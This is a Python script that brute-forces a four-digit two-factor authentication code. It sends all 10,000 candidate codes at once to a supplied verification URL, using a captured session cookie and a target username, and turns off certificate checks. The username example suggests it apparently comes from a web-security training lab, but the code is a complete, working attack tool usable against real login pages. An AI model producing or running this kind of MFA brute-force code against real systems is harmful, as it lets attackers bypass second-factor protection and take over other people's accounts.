import asyncio
import aiohttp
import ssl
from aiohttp import ClientSession, TCPConnector
from aiohttp.client_exceptions import ClientConnectorError
import time

def generate_4_digit_codes():
    """Generate a list of all 4-digit codes from 0000 to 9999."""
    return [f"{i:04d}" for i in range(10000)]

async def test_code(session, url, cookie, verify_username, code, retries=3):
    """Test a single MFA code to see if it is valid."""
    payload = {
        'mfa-code': code,
        'verify': verify_username
    }
    for attempt in range(retries):
        try:
            async with session.post(url, data=payload, cookies=cookie) as response:
                if response.status == 302:
                    print(f"Success! Code {code} is valid.")
                    return code
                return None
        except ClientConnectorError as e:
            print(f"Request failed for code {code} (attempt {attempt + 1}): {e}")
            await asyncio.sleep(2)  # Wait before retrying
    return None

async def brute_force_mfa(url, cookie, verify_username):
    """Brute force MFA codes to find the valid one."""
    codes = generate_4_digit_codes()

    # Disable SSL verification by creating a custom SSL context
    sslcontext = ssl.create_default_context()
    sslcontext.check_hostname = False
    sslcontext.verify_mode = ssl.CERT_NONE

    connector = TCPConnector(ssl=sslcontext)

    async with ClientSession(connector=connector) as session:
        tasks = [test_code(session, url, cookie, verify_username, code) for code in codes]
        results = await asyncio.gather(*tasks)

        valid_code = next((code for code in results if code is not None), None)
        if valid_code:
            print(f"Valid MFA code found: {valid_code}")
        else:
            print("No valid MFA code found.")

if __name__ == "__main__":
    url = input("Enter the 2FA verification URL (e.g., https://example.com/login2): ").strip()
    session_cookie_value = input("Enter the session cookie value: ").strip()
    verify_username = input("Enter the username to verify (e.g., carlos): ").strip()

    cookie = {'session': session_cookie_value}

    try:
        asyncio.run(brute_force_mfa(url, cookie, verify_username))
    except Exception as e:
        print(f"An error occurred: {e}")
